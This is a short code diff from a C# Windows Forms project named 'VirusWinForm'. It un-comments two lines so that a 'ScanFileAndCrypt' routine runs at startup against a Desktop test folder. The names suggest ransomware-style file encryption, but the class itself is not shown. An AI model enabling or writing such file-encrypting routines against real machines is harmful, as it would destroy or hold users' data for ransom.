@@ -17,8 +17,8 @@ namespace VirusWinForm
 
             // if (args.Length <= 0)
 
-            //ScanFileAndCrypt scf = new ScanFileAndCrypt();
-            //scf.DirectorySearch(@"C:\Users\Admin\Desktop\Filetest");
+            ScanFileAndCrypt scf = new ScanFileAndCrypt();
+            scf.DirectorySearch(@"C:\Users\Admin\Desktop\Filetest");
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
